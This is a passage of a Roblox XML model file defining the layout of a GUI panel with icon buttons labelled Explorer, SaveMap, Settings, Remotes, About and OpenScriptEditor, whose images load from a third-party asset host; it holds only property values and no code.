							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="ImageLabel" referent="RBXCA6453E4A7454F1EADCB69E31F7FDD6C">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<Content name="Image"><url>http://unixfr.xyz/asset/?id=474172996</url></Content>
							<Color3 name="ImageColor3">4293519849</Color3>
							<Vector2 name="ImageRectOffset">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Vector2 name="ImageRectSize">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<float name="ImageTransparency">0</float>
							<string name="Name">Slant</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>90</YO>
							</UDim2>
							<float name="Rotation">180</float>
							<token name="ScaleType">0</token>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<Rect2D name="SliceCenter">
								<min>
									<X>0</X>
									<Y>0</Y>
								</min>
								<max>
									<X>0</X>
									<Y>0</Y>
								</max>
							</Rect2D>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX9E2226EDDB4E43599E388B002F0FD314">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Main</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX64993608208D437295DC86818A0CC54B">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4292664540</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">true</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">SlideOut</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>150</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="Frame" referent="RBX788F1944FFEB4E28803063BDB38717E9">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4292664540</Color3>
								<float name="BackgroundTransparency">0</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">SlideFrame</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>-150</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>30</XO>
									<YS>0</YS>
									<YO>150</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextButton" referent="RBX07CD2D4E633E4511944A2D45BD9AF869">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">false</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">7</token>
									<bool name="Modal">false</bool>
									<string name="Name">Explorer</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>120</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>30</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">24</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX3AFE5763FB3D4203B7AF184BC82F99D2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">1</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://unixfr.xyz/asset/?id=472635937</url></Content>
										<Color3 name="ImageColor3">4282795590</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Icon</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBX20A2AB762836443BAA23CBECC7E711F7">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">false</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">7</token>
									<bool name="Modal">false</bool>
									<string name="Name">SaveMap</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>90</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>30</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">24</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX3DF74D8D1E034F659B898719C4565E05">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">1</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://unixfr.xyz/asset/?id=472636337</url></Content>
										<Color3 name="ImageColor3">4282795590</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Icon</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBX2206B2E36DE94B499A7E8BEC46F5286A">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">false</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">7</token>
									<bool name="Modal">false</bool>
									<string name="Name">Settings</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>30</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">24</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX243A752ED4B6445988323C45CC148EDF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">1</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://unixfr.xyz/asset/?id=472635774</url></Content>
										<Color3 name="ImageColor3">4282795590</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Icon</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBXEF3B7D2218D4419A957D806F5ED6DB8B">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">false</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">7</token>
									<bool name="Modal">false</bool>
									<string name="Name">Remotes</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>30</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">24</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX5D84596EE42F4DC5A54536E5E04965E2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">1</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://unixfr.xyz/asset/?id=472636187</url></Content>
										<Color3 name="ImageColor3">4282795590</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Icon</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBX6F190CE7070D49089D18317872A1995F">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">false</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">7</token>
									<bool name="Modal">false</bool>
									<string name="Name">About</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>30</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">24</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX2E13AAB3E6784B829DBEACF61B9602B4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">1</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://unixfr.xyz/asset/?id=476354004</url></Content>
										<Color3 name="ImageColor3">4282795590</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Icon</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
						</Item>
					</Item>
					<Item class="TextButton" referent="RBX2D515E4820004632BC91AAF22E720792">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<bool name="AutoButtonColor">false</bool>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">7</token>
							<bool name="Modal">false</bool>
							<string name="Name">OpenScriptEditor</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">true</bool>
							<bool name="Selected">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<string name="Text"></string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">24</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
						<Item class="ImageLabel" referent="RBXD6B2F60B14F449D1B00DFB6ED2875941">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<Content name="Image"><url>http://unixfr.xyz/asset/?id=475456048</url></Content>
								<Color3 name="ImageColor3">4279970357</Color3>
								<Vector2 name="ImageRectOffset">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Vector2 name="ImageRectSize">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<float name="ImageTransparency">1</float>
								<string name="Name">Icon</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>5</XO>
									<YS>0</YS>
									<YO>5</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<token name="ScaleType">0</token>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<Rect2D name="SliceCenter">
									<min>
										<X>0</X>
										<Y>0</Y>
									</min>
									<max>
										<X>0</X>
										<Y>0</Y>
									</max>
								</Rect2D>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="TextButton" referent="RBX1F432D34B2604AB2B10D89B1650079D1">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<bool name="AutoButtonColor">true</bool>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<token name="Font">3</token>
						<token name="FontSize">7</token>
						<bool name="Modal">false</bool>
						<string name="Name">Toggle</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">true</bool>
						<bool name="Selected">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>30</XO>
							<YS>0</YS>
							<YO>30</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<string name="Text">&lt;</string>
						<Color3 name="TextColor3">4279970357</Color3>
						<bool name="TextScaled">false</bool>
						<float name="TextSize">24</float>
						<Color3 name="TextStrokeColor3">4278190080</Color3>
						<float name="TextStrokeTransparency">1</float>
						<float name="TextTransparency">0</float>
						<bool name="TextWrapped">false</bool>
						<token name="TextXAlignment">2</token>
						<token name="TextYAlignment">1</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">1</int>
					</Properties>
				</Item>
				<Item class="Frame" referent="RBXC7007CD0B053436EBA4B765BC7DA23F1">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294967295</Color3>
						<float name="BackgroundTransparency">0.100000001</float>
						<Color3 name="BorderColor3">4290756543</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">SettingsPanel</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>1</YS>
							<YO>0</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">1</int>
					</Properties>
					<Item class="Frame" referent="RBXEF9857DD74824C1FBBFFCA4AF9824066">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
